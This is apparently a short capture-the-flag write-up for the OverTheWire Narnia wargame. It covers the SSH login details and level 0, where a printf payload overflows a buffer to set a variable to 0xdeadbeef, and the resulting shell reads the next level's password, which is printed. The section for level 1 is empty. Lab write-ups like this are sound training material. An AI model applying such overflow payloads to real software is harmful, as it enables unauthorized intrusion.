# [The Narnia wargame](https://overthewire.org/wargames/narnia/)
host: [narnia.labs.overthewire.org](narnia.labs.overthewire.org)  
port: 2226  
username: narnia<level>  
start password: narnia0  
### login via ssh
```
ssh narnia<level>@narnia.labs.overthewire.org -p 2226
```

### level 0 -> 1
Simple buffer overflow
```shell
narnia0@narnia:/narnia$ (printf 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde';cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
**password:**  
efeidiedae

### level 1 -> 2

**password:**  
